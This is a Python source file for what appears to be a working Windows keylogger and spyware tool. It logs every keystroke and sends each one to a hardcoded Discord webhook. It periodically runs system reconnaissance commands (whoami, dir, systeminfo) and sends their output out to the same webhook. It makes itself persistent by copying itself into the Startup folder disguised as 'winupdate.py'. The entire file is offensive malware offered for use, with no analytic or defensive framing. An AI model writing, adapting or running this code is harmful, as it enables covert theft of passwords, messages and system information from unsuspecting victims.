import requests
import subprocess
import threading
from pynput.keyboard import Listener
import time
import os
import shutil
import getpass

# Your Discord webhook from the JSON
WEBHOOK_URL = "https://discord.com/api/webhooks/1419903602608177190/hXLJxyytAjhkm3e2sq3W0pJhdQqC9IiD9pFSNYPTLfNe2N-MC7kGAGeDTOrF3JK2t5XB"

def send_to_discord(message):
    try:
        payload = {"content": message[:2000]}  # Discord limits messages to 2000 chars
        requests.post(WEBHOOK_URL, json=payload)
    except:
        pass

def keylogger():
    def on_press(key):
        send_to_discord(f"KEY: {str(key)}")
    with Listener(on_press=on_press) as listener:
        listener.join()

def run_commands():
    commands = ["whoami", "dir", "systeminfo"]  # Add more commands as needed
    while True:
        for cmd in commands:
            try:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                output = f"Command `{cmd}`:\n{result.stdout}\nErrors: {result.stderr}"
                send_to_discord(output)
            except:
                send_to_discord(f"Error running command: {cmd}")
            time.sleep(60)  # Run every 60 seconds to avoid rate limits

def main():
    # Ensure persistence
    try:
        script_path = os.path.abspath(__file__)
        startup_path = f"C:\\Users\\{getpass.getuser()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\winupdate.py"
        shutil.copy(script_path, startup_path)
    except:
        pass
    # Start keylogger and command runner in separate threads
    threading.Thread(target=keylogger, daemon=True).start()
    threading.Thread(target=run_commands, daemon=True).start()
    while True:
        time.sleep(1000)  # Keep script running

if __name__ == "__main__":
    main()